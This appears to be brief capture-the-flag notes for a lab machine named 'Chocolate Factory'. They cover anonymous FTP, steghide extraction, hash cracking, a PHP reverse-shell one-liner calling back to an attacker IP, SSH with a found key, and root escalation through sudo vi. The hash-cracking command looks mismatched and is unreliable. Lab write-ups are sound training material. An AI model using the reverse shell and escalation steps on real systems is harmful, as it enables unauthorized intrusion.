# Chocolate Factory
```
EXPORT IP = 10.10.241.129
```

#### SCAN
 - nmap/initial

#### Reconissance
 - `Ftp/21` : `Allow Anonymous Login`
 - get gum_room.jpg
   - `steghide extract -sf gum_room.jpg` >> b64.txt
   - `cat b64.txt | base64 -d` >> passwd

#### Crack the Hash
 - `sudo /usr/bin/ssh2john.py passwd --wordlist={ROCK_YOU_FILE}`

 
#### Reverse Shell Payload
 -  php -r '$sock=fsockopen("MY_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

#### USER Escalate
 - `/home/charlie/teleport`
 - `chmod 600 teleport`
 - `ssh -i teleport charlie@{IP}`

#### Root Privilige Escalate
 - `sudo -l`
 - `sudo /usr/bin/vi`
 - `python root.py` << "-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY="